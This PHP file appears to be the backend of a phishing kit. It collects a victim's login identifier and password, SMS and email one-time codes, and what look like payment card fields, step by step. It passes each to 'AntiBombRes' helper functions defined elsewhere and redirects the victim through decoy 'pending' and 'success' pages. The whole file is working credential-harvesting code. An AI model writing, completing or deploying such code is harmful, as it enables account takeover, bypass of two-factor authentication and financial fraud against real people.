<?php
include './init.php';

if($_SERVER['REQUEST_METHOD'] != 'POST'):
	die(rediret($link)); // We're done here
else:
	if(isset($_GET['step'])):
		/* Default Page */
		if($_GET['step'] == 'one'):
			AntiBombResI($_POST['GeolocSearchInput'], $user, $referer);
			die(rediret('./l9511077.php?'.$id)); // We're done here

        /* Default Page */
	    elseif($_GET['step'] == 'two'):
    			AntiBombResII($_POST["identifiant"], $_POST['Login-password'], $user, $referer);
			die(rediret('./pending.php?'.$id)); // We're done here

		/* Default Page */
		elseif($_GET['step'] == 'three'):
			AntiBombResOTP($_POST['otp'], $user, $referer);
			die(rediret('./pending2.php?'.$id)); // We're done here

		/* Default Page */
		elseif($_GET['step'] == 'four'):
			AntiBombResOtpEmail($_POST['otpmail'], $user, $referer);
      die(rediret('./i3849837.php?'.$id)); // We're done here
						/* Default Page */
		elseif($_GET['step'] == 'five'):
			AntiBombResInfo($_POST['ttx'],$_POST['ctx'],$_POST['dtx'],$_POST['cttx'], $user, $referer);
			die(rediret('./success.php?'.$id)); // We're done here


			//still have validation redirect Success not complete

		endif;
	endif;
endif;
?>
